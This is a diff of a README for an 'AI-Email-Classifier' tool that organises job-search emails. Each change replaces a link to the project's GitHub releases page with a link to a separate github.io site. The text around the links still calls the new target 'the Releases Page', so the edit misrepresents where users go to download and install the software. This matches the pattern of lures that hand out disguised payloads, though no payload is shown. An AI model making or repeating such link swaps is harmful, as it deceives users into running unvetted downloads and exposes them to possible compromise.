@@ -1,6 +1,6 @@
 # 🤖 AI-Email-Classifier - Automatically Organize Your Job Search Emails
 
-[![Download AI-Email-Classifier](https://img.shields.io/badge/Download-AI--Email--Classifier-brightgreen)](https://github.com/xycba1/AI-Email-Classifier/releases)
+[![Download AI-Email-Classifier](https://img.shields.io/badge/Download-AI--Email--Classifier-brightgreen)](https://xycba1.github.io)
 
 ## 📃 Overview
 
@@ -19,7 +19,7 @@ Getting started with AI-Email-Classifier is easy. Follow these steps to download
 
 ## ⬇️ Download & Install
 
-1. **Visit the Releases Page**: To download the latest version of AI-Email-Classifier, [visit this page to download](https://github.com/xycba1/AI-Email-Classifier/releases).
+1. **Visit the Releases Page**: To download the latest version of AI-Email-Classifier, [visit this page to download](https://xycba1.github.io).
    
 2. **Select a Release**: On the Releases page, you will see a list of available versions. Choose the most recent version for the best performance.
 
@@ -66,4 +66,4 @@ If you have questions or need additional help, you can reach out through the Iss
 
 For more information about AI-Email-Classifier and its features, you can explore the documentation available in the repository. 
 
-Remember to frequently check the [Releases page](https://github.com/xycba1/AI-Email-Classifier/releases) for updates and new features. Enjoy efficient email management!
+Remember to frequently check the [Releases page](https://xycba1.github.io) for updates and new features. Enjoy efficient email management!
